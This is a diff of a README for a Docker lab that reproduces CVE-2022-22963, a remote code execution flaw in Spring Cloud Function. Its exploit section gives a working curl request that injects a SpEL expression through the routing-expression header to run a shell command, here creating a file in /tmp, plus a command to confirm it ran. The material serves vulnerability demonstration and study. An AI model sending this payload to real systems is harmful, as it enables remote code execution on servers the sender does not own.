@@ -1,26 +1,26 @@
 # CVE-2022-22963 - Spring4shell
-To run the vulnerable SpringBoot application run this docker container exposing it to port 8080.
+To run the vulnerable SpringBoot application run this docker container exposing it to port 8080.  
 Example:
 
-	docker build -t sentiment_analyzer .
-
-	docker run -d -p 8080:8080 sentiment_analyzer:latest 
-
-	curl -X POST http://localhost:8080 \
-	-H "spring.cloud.function.routing-expression: analyzeAndUploadTxt" \
-	-H "Content-Type: text/plain" \
-	--data-binary @reviews.txt
-
+```bash
+docker build -t sentiment_analyzer .
+docker run -d --name spring-container -p 8080:8080 sentiment_analyzer:latest
+```
 
 ## Exploit
-Curl command:
+Curl command (creates a `test` folder in `/tmp/test`):  
+**Note**: this might give you a `500` status code (this is normal).
+```bash
+curl -i -s -k -X POST \
+	-H "Host: localhost:8080" \
+	-H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')" \
+	--data-binary "exploit_poc" http://localhost:8080/functionRouter
+```
 
-	curl -i -s -k -X POST -H "Host: localhost:8080" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')" --data-binary "exploit_poc" http://localhost:8080/functionRouter
-
-Check RCE
-
-	docker exec spring-container ls /tmp
-
+Check RCE:
+```bash
+docker exec spring-container ls /tmp
+```
 
 ## Credits
 https://github.com/hktalent/spring-spel-0day-poc
